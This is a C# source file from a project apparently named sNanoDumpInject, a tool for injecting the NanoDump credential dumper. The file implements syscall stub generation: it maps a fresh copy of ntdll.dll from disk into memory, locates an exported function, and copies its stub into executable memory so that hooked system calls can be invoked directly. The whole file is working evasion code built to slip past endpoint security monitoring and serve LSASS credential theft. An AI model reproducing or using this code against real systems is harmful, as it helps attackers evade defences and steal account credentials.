using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

using sNanoDumpInject.DInvoke;

namespace sNanoDumpInject
{
    class DSyscall
    {
        public static IntPtr AllocateBytesToMemory(byte[] FileByteArray)
        {
            IntPtr pFile = Marshal.AllocHGlobal(FileByteArray.Length);
            Marshal.Copy(FileByteArray, 0, pFile, FileByteArray.Length);
            return pFile;
        }

        public static IntPtr AllocateFileToMemory(string FilePath)
        {
            if (!File.Exists(FilePath))
            {
                throw new InvalidOperationException("Filepath not found.");
            }

            byte[] bFile = File.ReadAllBytes(FilePath);
            return AllocateBytesToMemory(bFile);
        }

        public static IntPtr GetSyscallStub(string functionName)
        {
            var isWow64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));

            if (IntPtr.Size == 4 && isWow64)
                throw new InvalidOperationException("Generating Syscall stubs is not supported for WOW64.");

            var ntdllPath = string.Empty;
            var procModules = Process.GetCurrentProcess().Modules;

            foreach (ProcessModule module in procModules)
            {
                if (!module.FileName.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase)) continue;

                ntdllPath = module.FileName;
                break;
            }

            var pModule = AllocateFileToMemory(ntdllPath);
            var peMetaData = Generic.GetPeMetaData(pModule);

            var baseAddress = IntPtr.Zero;
            var regionSize = peMetaData.Is32Bit ? (IntPtr)peMetaData.OptHeader32.SizeOfImage : (IntPtr)peMetaData.OptHeader64.SizeOfImage;
            var sizeOfHeaders = peMetaData.Is32Bit ? peMetaData.OptHeader32.SizeOfHeaders : peMetaData.OptHeader64.SizeOfHeaders;

            var pImage = Native.NtAllocateVirtualMemory(
                (IntPtr)(-1), ref baseAddress, IntPtr.Zero, ref regionSize,
                Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                Data.Win32.WinNT.PAGE_READWRITE
            );

            var bytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, sizeOfHeaders);

            foreach (var ish in peMetaData.Sections)
            {
                var pVirtualSectionBase = (IntPtr)((ulong)pImage + ish.VirtualAddress);
                var pRawSectionBase = (IntPtr)((ulong)pModule + ish.PointerToRawData);

                bytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);

                if (bytesWritten != ish.SizeOfRawData)
                    throw new InvalidOperationException("Failed to write to memory.");
            }

            var pFunc = Generic.GetExportAddress(pImage, functionName);

            if (pFunc == IntPtr.Zero)
                throw new InvalidOperationException("Failed to resolve ntdll export.");

            baseAddress = IntPtr.Zero;
            regionSize = (IntPtr)0x50;

            var pCallStub = Native.NtAllocateVirtualMemory(
                (IntPtr)(-1), ref baseAddress, IntPtr.Zero, ref regionSize,
                Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                Data.Win32.WinNT.PAGE_READWRITE
            );

            bytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pCallStub, pFunc, 0x50);

            if (bytesWritten != 0x50)
                throw new InvalidOperationException("Failed to write to memory.");

            Native.NtProtectVirtualMemory((IntPtr)(-1), ref pCallStub, ref regionSize, Data.Win32.WinNT.PAGE_EXECUTE_READ);

            Marshal.FreeHGlobal(pModule);
            regionSize = peMetaData.Is32Bit ? (IntPtr)peMetaData.OptHeader32.SizeOfImage : (IntPtr)peMetaData.OptHeader64.SizeOfImage;

            Native.NtFreeVirtualMemory((IntPtr)(-1), ref pImage, ref regionSize, Data.Win32.Kernel32.MEM_RELEASE);


            return pCallStub;
        }

    }
}
